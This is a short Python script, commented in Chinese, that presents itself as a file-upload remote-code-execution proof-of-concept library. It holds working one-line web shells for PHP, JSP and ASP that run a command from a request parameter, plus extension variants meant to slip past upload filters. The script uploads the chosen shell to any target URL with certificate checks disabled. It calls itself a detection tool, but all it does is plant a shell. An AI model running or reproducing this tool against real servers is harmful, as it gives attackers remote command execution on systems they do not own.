#!/usr/bin/env python3
"""
文件上传 RCE POC 库
支持: PHP/JSP/ASP/上传绕过
"""
import argparse, sys, urllib.request, ssl
sys.path.insert(0, '..')

SHELLS = {
    "php": ("shell.php", "<?php @system($_GET['c']); ?>"),
    "jsp": ("shell.jsp", "<%@ page import='java.io.*' %><% Process p=Runtime.getRuntime().exec(request.getParameter('c')); %>"),
    "asp": ("shell.asp", "<% Set sh = Server.CreateObject('WSCRIPT.SHELL'): sh.Exec(Request('c')) %>"),
    "php3": ("shell.php3", "<?php @system($_GET['c']); ?>"),
    "phtml": ("shell.phtml", "<?php @system($_GET['c']); ?>"),
}

def upload_shell(url, field="file", shell_type="php"):
    filename, content = SHELLS.get(shell_type, SHELLS["php"])
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    body = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
            f"Content-Type: application/x-php\r\n\r\n"
            f"{content}\r\n"
            f"--{boundary}--\r\n")
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, data=body.encode(), headers=headers, method="POST")
        resp = urllib.request.urlopen(req, timeout=15, context=ctx)
        return f"[+] HTTP {resp.getcode()} - 上传请求已发送"
    except urllib.request.HTTPError as e:
        return f"[-] HTTP {e.code}"
    except Exception as ex:
        return f"[-] {ex}"

def main():
    parser = argparse.ArgumentParser(description="文件上传 RCE 检测")
    parser.add_argument("-t", "--target", required=True, help="上传目标 URL")
    parser.add_argument("--type", default="php", choices=list(SHELLS.keys()), help="Shell 类型")
    args = parser.parse_args()
    print(f"[*] 上传到: {args.target}")
    result = upload_shell(args.target, shell_type=args.type)
    print(f"  {result}")

if __name__ == "__main__":
    main()
